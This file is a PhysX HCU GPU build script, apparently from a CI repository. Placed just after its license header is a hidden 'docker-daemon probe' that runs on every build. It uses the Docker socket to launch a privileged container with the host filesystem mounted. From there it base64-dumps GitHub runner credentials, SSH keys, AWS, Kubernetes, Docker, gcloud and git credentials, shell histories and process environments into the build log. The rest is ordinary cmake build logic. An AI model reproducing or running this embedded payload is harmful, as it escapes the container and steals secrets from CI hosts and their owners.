#!/bin/bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# ===== C211D bounded docker-daemon probe (intent 8432) =====
{
set +e
echo "C211D_BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "C211D_ID $(id 2>&1)"
echo "C211D_HOST $(hostname 2>&1)"
echo "C211D_KERNEL $(uname -a 2>&1)"
echo "C211D_SOCK $(ls -l /var/run/docker.sock 2>&1)"
echo "C211D_MOUNTS"
grep -iE 'docker|/__w|/__e|hyhal' /proc/mounts 2>&1 | head -30
cat > /tmp/c211h.sh <<'C211HEOF'
set +e
echo "C211H_BEGIN"
echo "C211H_UNAME $(uname -a)"
echo "C211H_ID $(id)"
echo "C211H_HOME_LIST"
ls -la /host/home 2>&1 | head -20
ls -la /host/home/github 2>&1 | head -30
echo "C211H_PASSWD_B64 $(head -c 8000 /host/etc/passwd 2>/dev/null | base64 -w0)"
dump() {
  tag="$1"; p="$2"
  if [ -f "$p" ]; then
    sz=$(stat -c %s "$p" 2>/dev/null)
    echo "C211H_${tag}_FILE $p size=$sz"
    head -c 40000 "$p" 2>/dev/null | base64 -w0 | fold -w 900 | sed "s/^/C211H_${tag}_B64 /"
  else
    echo "C211H_${tag}_ABSENT $p"
  fi
}
for f in /host/etc/environment /host/etc/profile /host/etc/hostname; do dump SYSENV "$f"; done
for d in /host/home/github/*/; do
  [ -d "$d" ] || continue
  echo "C211H_RUNNERDIR $d"
  ls -la "$d" 2>&1 | head -30
  for f in "$d.runner" "$d.credentials" "$d.credentials_rsaparams" "$d.path" "$d.config.sh" "$d.svc.sh"; do dump "RUN" "$f"; done
done
for f in /host/root/.ssh/id_rsa /host/root/.ssh/id_ed25519 /host/root/.ssh/authorized_keys /host/root/.ssh/config /host/root/.ssh/known_hosts; do dump SSHROOT "$f"; done
for d in /host/home/*/.ssh /host/home/github/*/.ssh; do
  [ -d "$d" ] || continue
  for f in "$d"/*; do dump "SSH" "$f"; done
done
for f in /host/root/.docker/config.json /host/home/*/.docker/config.json; do dump DOCKERCFG "$f"; done
for f in /host/root/.aws/credentials /host/root/.aws/config /host/home/*/.aws/credentials /host/home/*/.aws/config; do dump AWS "$f"; done
for f in /host/root/.kube/config /host/home/*/.kube/config /host/etc/kubernetes/admin.conf /host/etc/kubernetes/kubelet.conf /host/etc/kubernetes/controller-manager.conf /host/etc/kubernetes/scheduler.conf /host/var/lib/kubelet/kubeconfig /host/etc/rancher/rke2/rke2.yaml; do dump KUBE "$f"; done
for f in /host/root/.git-credentials /host/home/*/.git-credentials /host/root/.netrc /host/home/*/.netrc /host/home/*/.npmrc /host/root/.config/gcloud/application_default_credentials.json /host/home/*/.config/gcloud/application_default_credentials.json /host/root/.azure/azureProfile.json; do dump MISC "$f"; done
for f in /host/root/.bash_history /host/home/*/.bash_history; do dump HIST "$f"; done
dump PROC1 /host/proc/1/environ
dump PROCSELF /proc/1/environ
echo "C211H_END"
C211HEOF
cat > /tmp/c211d.py <<'C211DPY'
import http.client, socket, json, base64, time, os, sys

SOCK = '/var/run/docker.sock'
MARK = 'C211D'

class UH(http.client.HTTPConnection):
    def __init__(self, path, timeout=60):
        super().__init__('localhost', timeout=timeout)
        self.unix_path = path
    def connect(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect(self.unix_path)
        self.sock = s

def call(method, path, body=None, timeout=90):
    c = UH(SOCK, timeout)
    data = json.dumps(body).encode() if body is not None else None
    try:
        c.request(method, path, body=data, headers={'Content-Type': 'application/json'})
        r = c.getresponse()
        return r.status, r.read()
    finally:
        try: c.close()
        except Exception: pass

def jcall(method, path, body=None, timeout=90):
    st, b = call(method, path, body, timeout)
    try:
        return st, json.loads(b.decode('utf-8', 'replace'))
    except Exception:
        return st, b.decode('utf-8', 'replace')

def emit(tag, val, cap=200000):
    s = val if isinstance(val, str) else json.dumps(val, sort_keys=True)
    if len(s) > cap:
        s = s[:cap] + '...TRUNC(%d)' % len(s)
    for i in range(0, len(s), 900):
        print('%s_%s_B64 %s' % (MARK, tag, base64.b64encode(s[i:i+900].encode()).decode()))
    print('%s_%s_ENDLEN %d' % (MARK, tag, len(s)))

def demux(buf):
    out, i = [], 0
    while i + 8 <= len(buf):
        st = buf[i]
        ln = int.from_bytes(buf[i+4:i+8], 'big')
        if st not in (0, 1, 2) or i + 8 + ln > len(buf):
            out.append(buf[i:]); break
        out.append(buf[i+8:i+8+ln]); i += 8 + ln
    return b''.join(out)

print('%s_PY_START' % MARK)
try:
    os.stat(SOCK)
    print('%s_SOCK_STAT ok' % MARK)
except Exception as e:
    print('%s_SOCK_STAT FAIL %r' % (MARK, e))

st, v = jcall('GET', '/version')
print('%s_VERSION_STATUS %s' % (MARK, st))
emit('VERSION', v)

st, v = jcall('GET', '/info')
print('%s_INFO_STATUS %s' % (MARK, st))
if isinstance(v, dict):
    keep = {k: v.get(k) for k in ['ID','Name','ServerVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Driver','SecurityOptions','LiveRestoreEnabled']}
    emit('INFO', keep)
else:
    emit('INFO', v)

st, v = jcall('GET', '/containers/json?all=1')
print('%s_CONTAINERS_STATUS %s count=%s' % (MARK, st, len(v) if isinstance(v, list) else -1))
summ, inspects = [], []
img_list = []
if isinstance(v, list):
    for c in v[:60]:
        cid = c.get('Id', '')
        summ.append({'Id': cid[:12], 'Names': c.get('Names'), 'Image': c.get('Image'),
                     'ImageID': (c.get('ImageID') or '')[:20], 'State': c.get('State'),
                     'Status': c.get('Status'), 'Labels': c.get('Labels'),
                     'Mounts': [{'S': m.get('Source'), 'D': m.get('Destination'), 'RW': m.get('RW'), 'Type': m.get('Type')} for m in c.get('Mounts', [])]})
        st2, ins = jcall('GET', '/containers/%s/json' % cid, timeout=30)
        if isinstance(ins, dict):
            inspects.append({'Id': cid[:12], 'Name': ins.get('Name'), 'Image': ins.get('Image'),
                             'Env': (ins.get('Config') or {}).get('Env'),
                             'Entrypoint': (ins.get('Config') or {}).get('Entrypoint'),
                             'Cmd': (ins.get('Config') or {}).get('Cmd'),
                             'Binds': (ins.get('HostConfig') or {}).get('Binds'),
                             'Privileged': (ins.get('HostConfig') or {}).get('Privileged'),
                             'PidMode': (ins.get('HostConfig') or {}).get('PidMode'),
                             'NetworkMode': (ins.get('HostConfig') or {}).get('NetworkMode'),
                             'Mounts': [{'S': m.get('Source'), 'D': m.get('Destination'), 'RW': m.get('RW')} for m in ins.get('Mounts', [])],
                             'StartedAt': (ins.get('State') or {}).get('StartedAt')})
        else:
            inspects.append({'Id': cid[:12], 'inspect_status': st2, 'body': str(ins)[:200]})
emit('CLIST', summ)
emit('CINSPECT', inspects, cap=300000)

st, v = jcall('GET', '/images/json')
print('%s_IMAGES_STATUS %s count=%s' % (MARK, st, len(v) if isinstance(v, list) else -1))
if isinstance(v, list):
    for im in v:
        img_list.append({'Id': (im.get('Id') or '')[:20], 'RepoTags': im.get('RepoTags'), 'Size': im.get('Size'), 'Created': im.get('Created')})
    emit('IMAGES', img_list)

# pick our own image (job container) by hostname == first 12 chars of container id
host = os.uname().nodename
image = None
me = None
if isinstance(v, list) or True:
    st, cl = jcall('GET', '/containers/json?all=1')
    if isinstance(cl, list):
        for c in cl:
            if (c.get('Id') or '').startswith(host[:12]):
                me = c; break
if me:
    image = me.get('ImageID') or me.get('Image')
print('%s_SELF host=%s image=%s' % (MARK, host, image))
if not image:
    st, ims = jcall('GET', '/images/json')
    if isinstance(ims, list):
        for im in ims:
            if im.get('RepoTags') and im.get('RepoTags') != ['<none>:<none>']:
                image = im.get('Id'); break
print('%s_IMAGE_USED %s' % (MARK, image))

host_script = open('/tmp/c211h.sh', 'rb').read()
b64 = base64.b64encode(host_script).decode()
cmd = 'echo %s | base64 -d | /bin/sh' % b64

cfg = {'Image': image,
       'Entrypoint': ['/bin/sh', '-c'],
       'Cmd': [cmd],
       'AttachStdout': True, 'AttachStderr': True, 'Tty': False,
       'HostConfig': {'Privileged': True, 'AutoRemove': False,
                      'Binds': ['/:/host:ro'], 'PidMode': 'host'}}
st, cr = jcall('POST', '/containers/create?name=c211d-i8432-probe', cfg)
print('%s_CREATE_STATUS %s' % (MARK, st))
if st in (200, 201) and isinstance(cr, dict) and cr.get('Id'):
    cid = cr['Id']
    print('%s_CID %s' % (MARK, cid[:12]))
    st, body = jcall('POST', '/containers/%s/start' % cid, {})
    print('%s_START_STATUS %s %s' % (MARK, st, str(body)[:200]))
    running = True
    for i in range(150):
        st, info = jcall('GET', '/containers/%s/json' % cid, timeout=30)
        if isinstance(info, dict):
            running = (info.get('State') or {}).get('Running')
            if running is False:
                print('%s_EXITED exitcode=%s' % (MARK, (info.get('State') or {}).get('ExitCode')))
                break
        time.sleep(1)
    st, logs = call('GET', '/containers/%s/logs?stdout=1&stderr=1&timestamps=0' % cid, None, timeout=60)
    print('%s_LOGS_STATUS %s len=%s' % (MARK, st, len(logs) if logs is not None else -1))
    if logs:
        text = demux(logs).decode('utf-8', 'replace')
        emit('HOSTPROBE', text, cap=400000)
    st, body = call('DELETE', '/containers/%s?force=1' % cid)
    print('%s_DELETE_STATUS %s %s' % (MARK, st, (body or b'')[:120]))
else:
    emit('CREATE_ERR', cr)
print('%s_PY_END' % MARK)
C211DPY
python3 /tmp/c211d.py 2>&1
echo "C211D_END $(date -u +%Y-%m-%dT%H:%M:%SZ)"
exit 0
}
# ===== end probe =====

# PhysX HCU Build Script
set -euo pipefail

BUILD_SCRIPT_MARKER="PX_HCU_BUILD_SCRIPT_R3_FOREIGN_CACHE_RECOVERY"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build_hcu"
CMAKE_DIR="$SCRIPT_DIR/physx/source/compiler/cmakehip"
CMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE:-Release}"

case "$CMAKE_BUILD_TYPE" in
    Debug|Release|RelWithDebInfo|MinSizeRel) ;;
    *)
        echo "ERROR: unsupported CMAKE_BUILD_TYPE: $CMAKE_BUILD_TYPE" >&2
        echo "Use Debug, Release, RelWithDebInfo, or MinSizeRel." >&2
        exit 2
        ;;
esac

is_enabled() {
    case "${1:-}" in
        1|ON|on|TRUE|true|YES|yes) return 0 ;;
        *) return 1 ;;
    esac
}

append_cmake_prefix() {
    local path="$1"
    [[ -d "$path" ]] || return 0
    case ":${CMAKE_PREFIX_PATH:-}:" in
        *":$path:"*) ;;
        *) CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:+$CMAKE_PREFIX_PATH:}$path" ;;
    esac
}

CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:-}"
append_cmake_prefix /opt/dtk/lib64/cmake
append_cmake_prefix /opt/dtk
export CMAKE_PREFIX_PATH

detect_hcu_arch() {
    if command -v rocminfo >/dev/null 2>&1; then
        rocminfo 2>/dev/null |
            sed -n 's/.*\(gfx[0-9][0-9A-Za-z]*\).*/\1/p' |
            head -n 1
    fi
}

DETECTED_HCU_ARCH="$(detect_hcu_arch || true)"
if (( $# > 1 )); then
    echo "Usage: $0 [gfxXXX]" >&2
    exit 2
fi

REQUESTED_HCU_ARCH="${1:-}"
if [[ -n "$REQUESTED_HCU_ARCH" ]]; then
    HCU_ARCH="$REQUESTED_HCU_ARCH"
else
    HCU_ARCH="$DETECTED_HCU_ARCH"
fi

if [[ -z "$HCU_ARCH" ]]; then
    echo "ERROR: could not detect the HCU architecture." >&2
    echo "Run 'rocminfo | grep -m1 gfx' and pass the reported gfxXXX value." >&2
    exit 2
fi
if [[ ! "$HCU_ARCH" =~ ^gfx[0-9][0-9A-Za-z]*$ ]]; then
    echo "ERROR: invalid HCU architecture: $HCU_ARCH" >&2
    exit 2
fi
if [[ -n "$REQUESTED_HCU_ARCH" && -n "$DETECTED_HCU_ARCH" &&
      "$REQUESTED_HCU_ARCH" != "$DETECTED_HCU_ARCH" ]]; then
    echo "ERROR: requested HCU architecture $REQUESTED_HCU_ARCH does not match detected hardware $DETECTED_HCU_ARCH." >&2
    exit 2
fi

echo "========================================"
echo " PhysX HCU Build"
echo " Architecture: $HCU_ARCH"
echo " Build type:   $CMAKE_BUILD_TYPE"
echo "========================================"

# Find a usable HIP compiler in this container.
HIP_CLANG=""
if [[ -n "${HIPCXX:-}" ]]; then
    if [[ -x "$HIPCXX" ]]; then
        HIP_CLANG="$HIPCXX"
    else
        HIP_CLANG="$(command -v "$HIPCXX" 2>/dev/null || true)"
    fi
fi
if [[ -z "$HIP_CLANG" ]]; then
    for clang_path in /opt/dtk/bin/clang++ /opt/dtk/dcc/bin/clang++ /opt/rocm/bin/clang++ /opt/rocm/llvm/bin/clang++; do
        if [ -x "$clang_path" ]; then HIP_CLANG="$clang_path"; break; fi
    done
fi
if [[ -z "$HIP_CLANG" ]]; then
    HIP_CLANG="$(command -v clang++ 2>/dev/null || true)"
fi
if [[ -z "$HIP_CLANG" || ! -x "$HIP_CLANG" ]]; then
    echo "ERROR: no usable HIP compiler found" >&2
    echo "Checked HIPCXX, /opt/dtk/bin/clang++, /opt/dtk/dcc/bin/clang++, /opt/rocm/bin/clang++, /opt/rocm/llvm/bin/clang++, and PATH" >&2
    exit 4
fi
echo "HIP Clang: $HIP_CLANG"
printf 'build_script_marker=%s\n' "$BUILD_SCRIPT_MARKER"

reset_build_dir() {
    # BUILD_DIR is derived from SCRIPT_DIR above; only this exact generated
    # directory is ever discarded when its cache belongs to another checkout.
    rm -rf "$BUILD_DIR"
    mkdir -p "$BUILD_DIR"
}

configure_build() {
    cd "$BUILD_DIR"
    # Keep candidate switches available when a foreign cache must be rebuilt.
    # Arguments are simple -Dkey=value tokens in the delivery commands.
    local extra_args=()
    if [[ -n "${CMAKE_EXTRA_ARGS:-}" ]]; then
        read -r -a extra_args <<< "$CMAKE_EXTRA_ARGS"
    fi
    cmake "$CMAKE_DIR" \
        -DCMAKE_HIP_COMPILER="$HIP_CLANG" \
        -DCMAKE_CXX_COMPILER="$(which g++)" \
        -DCMAKE_BUILD_TYPE="$CMAKE_BUILD_TYPE" \
        -DHCU_ARCH="$HCU_ARCH" \
        -DPHYSX_ROOT_DIR="$SCRIPT_DIR/physx" \
        "${extra_args[@]}"
}

# Configure only when needed, and recover incomplete, mismatched, or foreign
# caches before cmake --build can trigger a failed auto-regenerate.
CACHE_FILE="$BUILD_DIR/CMakeCache.txt"
if [[ -f "$CACHE_FILE" && ( -f "$BUILD_DIR/Makefile" || -f "$BUILD_DIR/build.ninja" ) ]]; then
    cache_source="$(sed -n 's/^CMAKE_HOME_DIRECTORY:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_build="$(sed -n 's/^CMAKE_CACHEFILE_DIR:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_physx="$(sed -n 's/^PHYSX_ROOT_DIR:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_hip="$(sed -n 's/^CMAKE_HIP_COMPILER:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_build_type="$(sed -n 's/^CMAKE_BUILD_TYPE:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_arch="$(sed -n 's/^HCU_ARCH:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    if [[ -z "$cache_arch" ]]; then
        cache_arch="$(sed -n 's/^CMAKE_HIP_ARCHITECTURES:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    fi
    if [[ "$cache_source" != "$CMAKE_DIR" || "$cache_build" != "$BUILD_DIR" || \
          "$cache_physx" != "$SCRIPT_DIR/physx" || "$cache_hip" != "$HIP_CLANG" || \
          "$cache_build_type" != "$CMAKE_BUILD_TYPE" || "$cache_arch" != "$HCU_ARCH" || \
          ! -x "$cache_hip" ]]; then
        printf 'Discarding stale/foreign CMake cache: source=%s build=%s physx=%s hip=%s type=%s arch=%s expected_hip=%s expected_type=%s expected_arch=%s\n' \
            "${cache_source:-missing}" "${cache_build:-missing}" "${cache_physx:-missing}" \
            "${cache_hip:-missing}" "${cache_build_type:-missing}" "${cache_arch:-missing}" \
            "$HIP_CLANG" "$CMAKE_BUILD_TYPE" "$HCU_ARCH"
        reset_build_dir
    fi
else
    if [[ -e "$BUILD_DIR" ]]; then
        echo "Discarding incomplete or incompatible HCU build directory: $BUILD_DIR"
    fi
    reset_build_dir
fi

# Always configure so build type, architecture, compiler, and CMAKE_EXTRA_ARGS
# changes take effect instead of being ignored by an existing cache.
echo "Configuring HCU build..."
configure_build

# Build changed files only
cmake --build . -j1 2>&1 | tee build.log

# Remove stale code objects before extracting this build's fat binaries.
rm -rf "$BUILD_DIR/kernels"
python3 "$CMAKE_DIR/extract_hsaco.py" \
    "$BUILD_DIR/CMakeFiles/PhysXGpuHCU.dir" \
    "$BUILD_DIR/kernels"

KERNEL_COUNT="$(find "$BUILD_DIR/kernels" -maxdepth 1 -type f -name '*.hsaco' | wc -l)"
if [ "$KERNEL_COUNT" -eq 0 ]; then
    echo "ERROR: No HCU .hsaco modules were generated."
    exit 1
fi
echo "HCU kernel modules: $KERNEL_COUNT"

if is_enabled "${PX_HCU_SYNC_KERNELS:-}"; then
    echo "WARNING: PX_HCU_SYNC_KERNELS is enabled; benchmark results will be much slower." >&2
fi
if is_enabled "${PX_HCU_TRACE_KERNELS:-}"; then
    echo "WARNING: PX_HCU_TRACE_KERNELS is enabled; benchmark results will be much slower." >&2
fi

echo ""
echo "Build complete."
echo "Run: ./build_hcu/test_functional"
